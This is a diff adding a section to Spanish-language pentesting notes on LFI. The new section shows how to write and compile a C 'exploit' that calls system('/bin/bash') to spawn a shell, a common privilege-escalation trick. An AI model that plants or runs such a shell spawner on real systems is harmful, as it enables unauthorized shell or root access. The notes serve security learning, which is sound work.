@@ -13,3 +13,18 @@ Como se ha dicho al principio, el LFI ocurre cuando mediante un campo de entrada
    3   │ ?>
 ───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
+## CREACIÓN EXPLOIT LENGUAJE C
+
+para crear un exploit de lenguaje c, se crear un archivo con la extensión .c y acontinuacion lo siguiente:
+```ruby
+#include <stdio.h>
+#include <stdlib.h>
+int main(void){
+        system("/bin/bash");
+        return 0;
+}
+```
+Una vez creado el archivo se debe compilar para transformarlo en binario.
+```ruby
+gcc exploit.c -o binarioexploit
+```
